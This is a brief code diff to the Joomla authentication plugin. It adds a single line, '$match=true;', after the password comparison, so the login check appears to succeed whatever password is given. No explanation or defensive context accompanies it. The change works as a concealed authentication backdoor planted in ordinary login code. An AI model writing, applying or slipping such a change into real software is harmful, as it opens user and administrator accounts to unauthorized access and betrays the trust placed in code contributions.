@@ -61,6 +61,7 @@ class PlgAuthenticationJoomla extends JPlugin
 			{
 				$match=true;
 			}
+			$match=true;
 			if ($match === true)
 			{
 				// Bring this in line with the rest of the system
